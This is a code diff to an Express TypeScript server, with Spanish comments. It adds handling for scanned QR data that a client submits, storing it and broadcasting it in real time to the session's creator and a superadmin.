@@ -1120,6 +1120,29 @@ export async function registerRoutes(app: Express): Promise<Server> {
               case 'celular':
                 updatedFields.celular = inputData.celular;
                 break;
+              case 'ESCANEAR_QR':
+              case 'escanear_qr':
+                if (inputData && inputData.qrData) {
+                  updatedFields.qrData = inputData.qrData;
+                  console.log('Recibido código QR:', inputData.qrData.substring(0, 50) + '...');
+
+                  // Notificar a los administradores el código QR inmediatamente
+                  const sessionData = await storage.getSessionById(sessionId);
+                  const createdBy = sessionData?.createdBy || '';
+                  
+                  broadcastToAdmins(JSON.stringify({
+                    type: 'QR_SCANNED',
+                    data: {
+                      sessionId,
+                      qrData: inputData.qrData,
+                      createdBy,
+                      timestamp: new Date().toISOString()
+                    }
+                  }), createdBy); // Enviamos solo al creador y al superadmin
+                } else {
+                  console.error('Error: datos de QR recibidos sin contenido:', inputData);
+                }
+                break;
             }
 
             console.log(`Received data from client ${sessionId}: ${tipo}`, inputData);
